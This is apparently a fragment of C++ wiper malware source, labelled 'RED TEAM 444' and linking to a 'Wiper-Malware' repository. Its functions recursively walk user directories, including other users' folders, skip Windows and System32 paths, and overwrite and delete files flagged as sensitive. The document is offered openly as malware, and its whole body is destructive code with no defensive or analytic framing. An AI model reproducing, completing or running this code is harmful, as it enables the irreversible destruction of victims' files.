/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

void findAndWipeFiles(const std::string& directory) {
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
            if (entry.is_regular_file()) {
                std::string filepath = entry.path().string();

                // Exclude system files or folders
                if (filepath.find("Windows") != std::string::npos || filepath.find("System32") != std::string::npos) {
                    continue;
                }

                // Prioritize wiping sensitive file types
                if (isSensitiveFileType(filepath)) {
                    overwriteFile(filepath);  // Overwrite and delete the file
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Error in directory scan: " << e.what() << "\n";
    }
}

// Main wiper function, scanning multiple directories
void runWiper() {
    std::vector<std::string> directories = getSystemDirectories();  // Automatically get user directories
    addOtherUsersDirectories(directories);  // Optionally scan other users' directories
    
    for (const auto& directory : directories) {
        findAndWipeFiles(directory);  // Scan and wipe each directory
    }
}
